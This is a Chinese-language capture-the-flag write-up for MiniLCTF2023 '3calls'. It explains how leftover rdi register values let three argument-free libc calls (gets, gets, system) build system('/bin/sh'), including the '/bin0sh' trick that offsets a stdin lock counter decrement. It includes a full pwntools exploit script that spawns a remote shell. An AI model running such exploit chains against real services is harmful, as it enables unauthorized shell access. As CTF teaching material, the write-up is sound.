# MiniLCTF2023 - 3calls

## 题目简述

程序直接泄露 libc 基址，随后接收三个 8 字节函数地址，并检查它们都对应所给 libc 的导出函数。最后按顺序无参数调用三次。附件实测为 Full RELRO、Canary、NX、PIE，因而题目不要求内存破坏，而是利用调用前残留的寄存器状态，把无参数函数组合成 `system("/bin/sh")`。

## 解题过程

程序在调用三个函数前执行 `puts("good job!")`。第一次调用时，`rdi` 恰好指向 libc 中可写的 `_IO_stdfile_1_lock`。选择 `gets` 可以把数据写到该地址；调用结束后，stdio 路径使 `rdi` 转而指向 `_IO_stdfile_0_lock`。第二次再调用 `gets`，前后都保持这个 stdin 锁地址，于是可把命令字符串写入其起始位置。第三次调用 `system` 时继续复用同一 `rdi`。

第一轮不能写入任意内容，否则会破坏 stdout 锁并使第二次 `gets` 死锁。写入 8 个零字节即可保持锁处于可用状态。第二轮也不能直接输入 `/bin/sh`：`gets` 释放 stdin 锁时会把偏移 4 的计数字段减 1，把字符串破坏为 `/bin.sh`。因此先写 `/bin0sh`，字符 `'0'` 的 `0x30` 被减为 `'/'` 的 `0x2f`，恰好得到 `/bin/sh`。

```python
from pwn import *

io = remote(HOST, PORT)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

io.recvuntil(b"gift: ")
libc.address = int(io.recvline(), 16)

io.send(p64(libc.sym.gets))
io.send(p64(libc.sym.gets))
io.send(p64(libc.sym.system))

io.recvuntil(b"good job!\n")
io.sendline(p64(0))
io.sendline(b"/bin0sh")
io.interactive()
```

精确偏移依赖题目随附的 libc；脚本通过符号表解析，不应把其他系统 libc 的地址硬编码进来。官方材料没有保存远程 flag 回包，因此这里只陈述已给出的 gets/gets/system 利用链。

## 方法总结

“不能传参”不等于“参数不可控”：System V AMD64 ABI 的参数寄存器会保留调用者刚使用的值，库函数本身还可能把它们改成新的有用指针。涉及 stdio 内部锁时，写入内容必须考虑锁的获取与释放副作用。本题最精妙的一步不是调用 `system`，而是用 `/bin0sh` 预补偿锁计数递减。
